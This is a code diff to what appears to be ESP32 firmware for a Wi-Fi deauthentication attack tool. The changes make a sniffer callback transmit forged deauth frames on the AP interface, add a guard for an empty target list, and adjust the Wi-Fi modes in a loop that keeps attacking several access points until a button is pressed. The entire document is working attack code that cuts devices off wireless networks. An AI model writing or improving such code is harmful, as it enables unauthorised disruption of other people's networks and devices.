@@ -27,7 +27,7 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (deauth_type == DEAUTH_TYPE_LIMITED) {
     if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
       memcpy(deauth_frame.station, mac_header->src, 6);
-      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
       eliminated_connections++;
     } else return;
   } else {
@@ -50,6 +50,11 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
   deauth_frame.reason = reason;
 
   if (deauth_type == DEAUTH_TYPE_LIMITED) {
+    if (wifi_numbers.empty()) {
+      DEBUG_PRINTLN("No valid network numbers provided!");
+      return;
+    }
+    
     // 支持多AP：遍历所有网络号
     DEBUG_PRINT("Starting Deauth-Attack on ");
     DEBUG_PRINT(wifi_numbers.size());
@@ -78,7 +83,6 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
     if (wifi_numbers.size() > 1)  {
       bool isInitialized = false;
       WiFi.softAPdisconnect();
-      WiFi.mode(WIFI_MODE_STA);
       while (!isBootButtonPressed_interrupt()) { 
         for (int wifi_number : wifi_numbers) {
           if (wifi_number >= 0) {
@@ -96,7 +100,6 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
         }
       }
       stop_deauth();
-      WiFi.mode(WIFI_MODE_AP);
       WiFi.softAP(AP_SSID, AP_PASS);
       DEBUG_PRINTLN("Deauth-Attack mode exited!");
     } return;
